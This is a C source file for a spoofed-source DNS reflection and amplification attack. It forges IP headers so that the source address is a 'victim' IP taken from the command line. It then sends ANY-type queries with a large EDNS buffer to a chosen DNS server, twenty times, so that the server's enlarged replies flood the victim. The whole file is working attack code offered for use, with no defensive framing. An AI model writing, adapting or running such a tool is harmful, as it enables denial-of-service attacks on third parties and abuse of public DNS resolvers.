// ----IP_Spoofing.c------
// Must be run by root lol! Just datagram, no payload/data

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

#define PCKT_LEN 8192

// Can create separate header file (.h) for all headers' structure
//IP header
typedef struct iphdr iph;
//UDP header
typedef struct udphdr udph;

//DNS_HEADER 
struct DNS_HEADER
{
    unsigned short id; // identification number
 
    unsigned char rd :1; // recursion desired
    unsigned char tc :1; // truncated message
    unsigned char aa :1; // authoritive answer
    unsigned char opcode :4; // purpose of message
    unsigned char qr :1; // query/response flag
 
    unsigned char rcode :4; // response code
    unsigned char cd :1; // checking disabled
    unsigned char ad :1; // authenticated data
    unsigned char z :1; // its z! reserved
    unsigned char ra :1; // recursion available
 
    unsigned short q_count; // number of question entries
    unsigned short ans_count; // number of answer entries
    unsigned short auth_count; // number of authority entries
    unsigned short add_count; // number of resource entries
};

//Constant sized fields of query structure
struct QUESTION
{
    unsigned short qtype;
    unsigned short qclass;
};
 
//Structure of a Query
typedef struct
{
    unsigned char *name;
    struct QUESTION *ques;
} QUERY;

#pragma pack(push)
#pragma pack(1)
//DNS additional reports
struct ADD_R
{
	unsigned char Name;
	unsigned short Type;
	unsigned short size;
	unsigned char rcode; 
	unsigned char version;
	unsigned short Z;
	unsigned short data_len;
};
#pragma pack(pop)

// Function for checksum calculation. From the RFC,
// the checksum algorithm is:
//  "The checksum field is the 16 bit one's complement of the one's
//  complement sum of all 16 bit words in the header.  For purposes of
//  computing the checksum, the value of the checksum field is zero."

unsigned short csum(unsigned short *buf, int nwords)
{     
	unsigned long sum;
	for(sum=0; nwords>0; nwords--)
	    sum += *buf++;

	sum = (sum >> 16) + (sum &0xffff);
	sum += (sum >> 16);

	return (unsigned short)(~sum);
}

/*
 * This will convert www.google.com to 3www6google3com 
 * got it :)
 * */

void dns_format(unsigned char * dns,unsigned char * host) 
{
	int lock = 0 , i;
	strcat((char*)host,".");
	for(i = 0 ; i < strlen((char*)host) ; i++) 
	{
		if(host[i]=='.') 
		{
			*dns++ = i-lock;
			for(;lock<i;lock++) 
			{
				*dns++=host[lock];
			}
			lock++;
		}
	}
	*dns++=0x00;
}


void dns_send(char *victim_ip, char *dns_ip, unsigned char *dns_record)
{
	// Building the DNS request data packet

	int vic_port = 80;
	unsigned char buf[65536],*qname, dns_rcrd[32];
	struct DNS_HEADER *dns = NULL;
	struct QUESTION *qinfo = NULL;
	struct ADD_R *add_rcrd = NULL;

	dns = (struct DNS_HEADER *)&buf;

	dns->id = (unsigned short) htons(getpid());
	dns->qr = 0; //This is a query
	dns->opcode = 0; //This is a standard query
	dns->aa = 0; //Not Authoritative
	dns->tc = 0; //This message is not truncated
	dns->rd = 1; //Recursion Desired
	dns->ra = 0; //Recursion not available! hey we dont have it (lol)
	dns->z = 0;
	dns->ad = 1;
	dns->cd = 0;
	dns->rcode = 0;
	dns->q_count = htons(1); //we have 1 question
	dns->ans_count = 0;
	dns->auth_count = 0;
	dns->add_count = htons(1); //one additional 

	//point to the query portion
	qname = (unsigned char*)&buf[sizeof(struct DNS_HEADER)];
	strcpy(dns_rcrd, dns_record);
	dns_format(qname , dns_rcrd);
	qinfo =(struct QUESTION*)&buf[sizeof(struct DNS_HEADER) + (strlen((const char*)qname) + 1)]; //fill it
	
	qinfo->qtype = htons(255); //type of the query , A , MX , CNAME , NS , ANY etc
	qinfo->qclass = htons(1); //its internet (lol)
	
	//point to the additional record
	printf("%ld\n", sizeof(struct ADD_R));
	add_rcrd = (struct ADD_R *)&buf[sizeof(struct DNS_HEADER) + (strlen((const char*)qname)) + sizeof(struct QUESTION) + 1];
	add_rcrd->Name = 0;
	add_rcrd->Type = htons(41);		//41
	add_rcrd->size = htons(4096);	//512
	add_rcrd->rcode = 0;
	add_rcrd->version = 0;
	add_rcrd->Z = htons(0);
	add_rcrd->data_len = htons(0);


	char datagram[PCKT_LEN], *data;
	memset(datagram, 0, PCKT_LEN);

	data = datagram + sizeof(iph) + sizeof(udph);
	memcpy(data, &buf, sizeof(struct DNS_HEADER) + (strlen(qname)+1) + sizeof(struct QUESTION) + sizeof(struct ADD_R));

	struct sockaddr_in sin;
	// The source is redundant, may be used later if needed
	// The address family
	sin.sin_family = AF_INET;
	
	// Port numbers
	sin.sin_port = htons(vic_port);

	// IP addresses
	sin.sin_addr.s_addr = inet_addr(dns_ip);

	// Fabricate the IP header or we can use the
	// standard header structures but assign our own values.
	iph *ip = (iph *)datagram;
	ip->version = 4;
	ip->ihl = 5;
	ip->tos = 0;
	ip->tot_len = sizeof(iph) + sizeof(udph) + sizeof(struct DNS_HEADER) + (strlen(qname)) + sizeof(struct QUESTION) + sizeof(struct ADD_R) + 1;
	ip->id = htonl(getpid());
	ip->frag_off = 0;
	ip->ttl = 64;
	ip->protocol = IPPROTO_UDP;
	ip->check = 0;
	ip->saddr = inet_addr(victim_ip);
	ip->daddr = inet_addr(dns_ip);
	ip->check = csum((unsigned short *)datagram, ip->tot_len);

	// Fabricate the UDP header. Source port number, redundant
	udph *udp = (udph *)(datagram + sizeof(iph));
	udp->source = htons(vic_port);
	udp->dest = htons(53);
	udp->len = htons(sizeof(udph) + sizeof(struct DNS_HEADER) + (strlen(qname)) + sizeof(struct QUESTION) + sizeof(struct ADD_R) + 1);
	
	int sd;
	// Create a raw socket with UDP protocol
	sd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	if(sd < 0)
	{
		perror("socket() error");
		// If something wrong just exit
		exit(-1);

	}
	else
		printf("socket() - Using SOCK_RAW socket and UDP protocol is OK.\n");

	int one = 1;
	const int *val = &one;
	if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
	{
		perror("setsockopt() error");
		exit(-1);
	}
	else
		printf("setsockopt() is OK.\n");	
	 
 	

	int count;
	int ver;
	for(count = 1; count <=20; count++)
	{

		if(sendto(sd, datagram, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
		// Verify
		{
			perror("sendto() error !!");
			exit(-1);
		}

		else
		{
			printf("Count #%u - sendto() is OK.\n", count);
			sleep(2);
		}

	}
	
	close(sd);
}

// Source IP, source port, target IP, target port from the command line arguments
int main(int argc, char *argv[])
{
	int cnt = 5;
	if(getuid()!=0)
		perror("You must be running as root!");
	else
	{
		if(argc == 3)
		{
			char *victim_ip = argv[1];
			char *dns_ip = argv[2];
			
			dns_send(victim_ip, dns_ip, "man.com");
		}
		else 
			printf("You must input Victim IP and DNS IP\n");
	}
		
	
	return 0;
}



